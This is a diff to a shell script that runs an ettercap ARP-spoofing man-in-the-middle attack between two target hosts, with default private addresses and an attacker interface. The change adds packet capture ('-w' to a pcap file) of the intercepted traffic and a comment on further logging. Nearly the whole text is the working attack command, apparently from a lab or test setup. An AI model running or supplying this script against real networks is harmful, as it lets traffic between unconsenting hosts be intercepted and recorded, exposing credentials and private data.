@@ -9,6 +9,7 @@
 ettercap --help |grep -q 'MAC/IP/IPv6/PORT'
 ipv6command=$?
 
+# init local vars
 if [[ $# -eq 0 ]]; then
     T1=192.168.1.20
     T2=192.168.1.30
@@ -22,9 +23,12 @@ else
     T2=$2
     ATT_IFACE=$3
 fi
+PCAP_FILE="$0.pcap"
 
+# execute the attack
+# add -L $0 to generate an .eci info logfile and .ecp packet logfile
 if [[ $ipv6command -eq 0 ]]; then
-    ettercap -T -M arp:remote /$T1// /$T2// -i $ATT_IFACE &
+    ettercap -T -w $PCAP_FILE -M arp:remote /$T1// /$T2// -i $ATT_IFACE &
 else
-    ettercap -T -M arp:remote /$T1/ /$T2/ -i $ATT_IFACE &
+    ettercap -T -w $PCAP_FILE -M arp:remote /$T1/ /$T2/ -i $ATT_IFACE &
 fi
